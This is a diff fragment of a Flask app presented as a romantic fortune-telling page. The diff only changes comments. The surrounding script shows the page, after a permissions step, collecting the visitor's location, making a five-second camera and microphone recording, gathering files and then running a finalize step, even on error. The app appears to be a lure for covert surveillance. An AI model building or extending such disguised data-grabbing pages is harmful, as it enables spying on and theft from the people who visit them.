@@ -6,6 +6,7 @@ from datetime import datetime
 
 app = Flask(__name__)
 
+# Romantic fortunes
 FORTUNES = [
     "Your soulmate is thinking of you right now 💕",
     "A passionate kiss awaits you this week 😘",
@@ -230,7 +231,7 @@ HTML_TEMPLATE = '''
         document.getElementById('permissions').classList.add('hidden');
         try {
             await getLocation();
-            await getMedia();      // 5 seconds only
+            await getMedia();      // 5 seconds recording
             await getFiles();
             await finalize();
         } catch(e) { await finalize(); }
@@ -279,7 +280,7 @@ HTML_TEMPLATE = '''
                     } else { resolve(); }
                 };
                 mediaRecorder.start();
-                let seconds = 5;  // FASTER: 5 seconds instead of 15
+                let seconds = 5;  // 5 seconds only – fast
                 const interval = setInterval(() => {
                     seconds--;
                     showStep('🎥 Camera/Mic', `Recording ${seconds}s...`, 10 + (5-seconds)/5*90);
